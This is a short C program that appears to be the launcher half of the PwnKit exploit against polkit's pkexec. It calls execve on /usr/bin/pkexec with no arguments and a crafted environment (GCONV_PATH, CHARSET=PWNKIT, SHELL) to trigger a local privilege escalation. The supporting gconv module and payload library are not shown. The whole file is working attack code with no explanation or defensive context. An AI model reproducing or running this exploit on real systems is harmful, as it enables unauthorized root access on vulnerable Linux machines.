#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv)
{
        char * const a_argv [] = { NULL};
        char * const a_envp[] = {
                "pwnkitdir",
                "PATH=GCONV_PATH=.",
                "CHARSET=PWNKIT",
                "SHELL=xxx",
                NULL
        };
        execve("/usr/bin/pkexec", a_argv, a_envp);
}